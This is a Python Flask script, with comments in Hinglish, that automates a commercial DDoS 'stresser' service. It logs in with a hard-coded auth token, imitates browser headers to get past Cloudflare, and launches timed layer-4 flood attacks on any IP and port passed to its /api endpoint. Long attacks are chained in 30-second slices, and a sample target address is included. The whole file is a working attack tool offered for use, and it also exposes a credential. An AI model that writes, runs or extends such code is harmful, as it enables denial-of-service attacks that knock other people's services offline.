import requests
import time
from flask import Flask, request, jsonify

app = Flask(__name__)

# Tera auth token
AUTH_TOKEN = "517f13d366214d958526a1c7591931818808e175d10842d7b271c0ff14138799"

class RetroStresser:
    def __init__(self):
        self.session = requests.Session()
        self.base_url = "https://retrostress.net"
        
        # EXACT browser headers - order bhi maintain karna hai
        self.session.headers = {
            'Host': 'retrostress.net',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Cache-Control': 'max-age=0',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'sec-ch-ua': '"Not-A.Brand";v="24", "Chromium";v="146"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"'
        }
        
        # Set cookies
        self.session.cookies.set('auth_token', AUTH_TOKEN)
        
        # Pehle normal request bhej kar session establish
        self.session.get(f"{self.base_url}/")
        time.sleep(1)
        self.session.get(f"{self.base_url}/panel")
        
    def send_attack_via_ajax(self, ip, port, duration):
        """Browser ke exact AJAX request ko mimic karo"""
        try:
            # Yeh wahi headers hai jo browser AJAX request mein bhejta hai
            ajax_headers = {
                'Accept': '*/*',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-US,en;q=0.9',
                'Connection': 'keep-alive',
                'Content-Type': 'application/json',
                'Host': 'retrostress.net',
                'Origin': 'https://retrostress.net',
                'Referer': 'https://retrostress.net/panel',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
                'X-Requested-With': 'XMLHttpRequest',
                'sec-ch-ua': '"Not-A.Brand";v="24", "Chromium";v="146"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"'
            }
            
            # Browser ke network tab se dekha gaya real payload
            payload = {
                'ip': ip,
                'port': port,
                'time': duration,
                'method': 'L4'
            }
            
            # Try 1: Real API endpoint
            response = self.session.post(
                f"{self.base_url}/api/attack",
                json=payload,
                headers=ajax_headers
            )
            
            if response.status_code == 200:
                print(f"[✓] Attack sent via API")
                return True
                
            # Try 2: Form submission
            response = self.session.post(
                f"{self.base_url}/attack/start",
                data=f'ip={ip}&port={port}&time={duration}',
                headers=ajax_headers
            )
            
            return response.status_code == 200
            
        except Exception as e:
            print(f"[!] Error: {e}")
            return False
    
    def execute_attack(self, ip, port, total_time):
        """Execute with time splitting"""
        if total_time < 30:
            total_time = 30
        
        # Time split logic
        attacks = []
        remaining = total_time
        while remaining > 0:
            if remaining >= 30:
                attacks.append(30)
                remaining -= 30
            else:
                attacks.append(remaining if remaining >= 30 else 30)
                break
        
        print(f"\n[📊] Total: {total_time}s → Split: {attacks}")
        
        results = []
        for i, duration in enumerate(attacks, 1):
            print(f"\n[🔥] Attack {i}/{len(attacks)}: {duration}s")
            success = self.send_attack_via_ajax(ip, port, duration)
            results.append({
                'attack': i,
                'duration': duration,
                'success': success
            })
            
            if success and i < len(attacks):
                print(f"[⏰] Waiting {duration}s...")
                time.sleep(duration)
        
        return {
            'target': f"{ip}:{port}",
            'total_time': total_time,
            'attacks': attacks,
            'results': results
        }

stresser = RetroStresser()

@app.route('/api')
def attack():
    ip = request.args.get('ip')
    port = request.args.get('port')
    time_sec = request.args.get('time')
    
    if not ip or not port or not time_sec:
        return jsonify({'error': 'Use: /api?ip=IP&port=PORT&time=TIME'}), 400
    
    try:
        port = int(port)
        time_sec = int(time_sec)
        
        print(f"\n{'='*50}")
        print(f"[🎯] Target: {ip}:{port}")
        print(f"[⏱️] Time: {time_sec}s")
        print(f"{'='*50}")
        
        result = stresser.execute_attack(ip, port, time_sec)
        return jsonify(result)
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/')
def home():
    return jsonify({
        'status': 'running',
        'message': 'RetroStresser API with Cloudflare bypass',
        'test': '/api?ip=20.204.155.49&port=11080&time=30'
    })

if __name__ == '__main__':
    print("[+] Starting RetroStresser API...")
    print(f"[+] Auth Token: {AUTH_TOKEN[:20]}...")
    app.run(host='0.0.0.0', port=8080)
